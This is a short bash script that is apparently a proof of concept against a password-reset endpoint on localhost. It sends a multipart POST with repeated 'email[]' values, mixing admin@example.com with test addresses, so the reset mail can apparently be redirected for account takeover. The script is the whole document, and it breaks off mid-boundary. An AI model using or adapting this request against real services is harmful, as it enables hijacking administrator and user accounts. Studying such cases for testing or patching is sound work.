#!/bin/bash

curl -X POST "http://localhost:9000/reset-password" \
  -H "Content-Type: multipart/form-data; boundary=----261884194610567658881788530377" \
  --data-binary $'------261884194610567658881788530377\r\nContent-Disposition: form-data; name="email[]"\r\n\r\nq1@test.test\r\n------261884194610567658881788530377\r\nContent-Disposition: form-data; name="email[]"\r\n\r\nadmin@example.com\r\n------261884194610567658881788530377\r\nContent-Disposition: form-data; name="email[]"\r\n\r\nq2@test.test\r\n-----